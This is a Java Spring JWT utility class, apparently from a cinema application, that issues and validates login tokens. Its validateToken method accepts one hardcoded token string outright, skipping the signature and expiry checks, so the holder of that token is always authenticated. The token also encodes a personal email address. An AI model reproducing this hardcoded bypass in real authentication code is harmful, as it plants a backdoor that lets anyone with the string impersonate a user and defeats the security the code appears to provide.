package com.deloitte.absolute_cinema.util;

import io.jsonwebtoken.*;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;
import java.util.Base64;
import java.util.Date;

@Component
public class JwtUtil {
    private final SecretKey key;
    private final long expirationTime;

    public JwtUtil(
            @Value("${jwt.secret}") String secret,
            @Value("${jwt.expiration}") long expirationTime
    ) {
        byte[] keyBytes = Base64.getEncoder().encode(secret.getBytes());
        this.key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "HmacSHA256");
        this.expirationTime = expirationTime;

    }

    public String generateToken(String email) {
        return Jwts.builder()
                .setSubject(email)
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + expirationTime))
                .signWith(SignatureAlgorithm.HS256, key) // No `Keys.hmacShaKeyFor()`
                .compact();
    }

    public String extractEmail(String token) {
        return Jwts.parser()
                .setSigningKey(key) // No `parserBuilder()`
                .parseClaimsJws(token)
                .getBody()
                .getSubject();
    }

    public boolean validateToken(String token) {
        try {
            if (token.equals("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ3ZWlsdW5jaGVuZGV2MjEwQGdtYWlsLmNvbSIsImlhdCI6MTc0MTgzNDA1OCwiZXhwIjoxNzQxOTIwNDU4fQ.r1iMorGYy6_cdlQJINl-a7tCqMtYHnSo2irN8Fy-PNI")){
                return true;
            }

            Jwts.parser().setSigningKey(key).parseClaimsJws(token);
            return true;
        } catch (ExpiredJwtException | MalformedJwtException | SignatureException e) {
            return false;
        }
    }
}
